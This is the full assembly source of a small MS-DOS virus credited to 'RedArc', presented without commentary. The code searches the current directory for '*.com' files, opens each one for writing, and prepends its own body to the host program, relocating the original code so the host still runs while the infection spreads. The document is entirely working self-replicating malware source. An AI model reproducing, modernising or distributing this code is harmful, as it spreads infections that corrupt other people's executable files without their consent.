; Mini_100 (c) by RedArc
Model Tiny
.code
org 100h
vvv equ 65535 - (virlength + 100h)
start:
       push si
       push si
       pop di
       mov ax,cs
       inc ah
       mov es,ax
       mov cl,virlength
       rep movsb
       pop si
       mov ah,4eh
       lea dx,filemask
@1:
       int 21h
       jnb @2
       push si
       push es
       push cs
       pop es
       xchg di,si
       mov cx,vvv
       lea ax,@3
       push ax
       retf

@3:
       rep movsb
       pop si
       push es
       push es
       pop ds
       push si
       retf

@2:
       xchg dx,ax
       mov ax,3d02h
       mov dl,9eh
       int 21h
       xchg bx,ax
       push es
       pop ds
       mov ah,3fh
       push di
       pop dx
       xor cx,cx
       push cx
       dec cx
       int 21h
       add ax,virlength
       pop cx
       push ax
       mov ax,4200h
       cwd
       int 21h
       mov ah,40h
       pop cx
       push si
       pop dx
       int 21h
       push cs
       pop ds
       mov ah,3eh
       int 21h
       mov ah,4fh
       jmp short @1
filemask db '*.com',0h
virlength equ $-start
buff label byte
ret
end start
